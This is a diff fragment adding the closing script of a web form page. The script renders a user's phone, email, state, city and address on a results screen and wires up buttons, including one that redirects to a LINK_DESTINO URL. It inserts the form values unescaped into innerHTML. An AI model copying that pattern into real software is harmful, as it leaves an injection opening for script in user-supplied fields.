+    {label:'Phone',   value:$('f-tel').value.trim()},
+    {label:'Email',   value:$('f-email').value.trim()},
+    {label:'State',   value:$('f-provincia').value},
+    {label:'City',    value:$('f-ciudad').value.trim()},
+    {label:'Address', value:$('f-direccion').value.trim()},
+  ];
+  box.innerHTML=data.map(d=>`
+    <div class="result-data-row">
+      <span class="result-data-label">${d.label}</span>
+      <span class="result-data-value">${d.value}</span>
+    </div>
+  `).join('');
+  showScreen('s-result');
+}
+
+/* ── EVENTS ── */
+document.addEventListener('DOMContentLoaded',()=>{
+  $('btn-start').addEventListener('click', start);
+  $('inp-name').addEventListener('keydown', e=>{ if(e.key==='Enter') start(); });
+  $('inp-name').addEventListener('input',   ()=>clearError('inp-name','err-name'));
+  $('btn-back').addEventListener('click',   goBack);
+  $('btn-form-submit').addEventListener('click', submitForm);
+
+  ['f-tel','f-email','f-ciudad','f-direccion','f-cp'].forEach(id=>{
+    const el=$(id);
+    if(el) el.addEventListener('input',()=>{
+      el.classList.remove('has-error');
+      const errKey = id.replace('f-','');
+      const errEl=$('err-'+errKey);
+      if(errEl) errEl.textContent='';
+    });
+  });
+  $('f-provincia').addEventListener('change',()=>clearError('f-provincia','err-provincia'));
+  $('btn-cta').addEventListener('click',()=>{ window.location.href=LINK_DESTINO; });
+});
+</script>
+</body>
+</html>
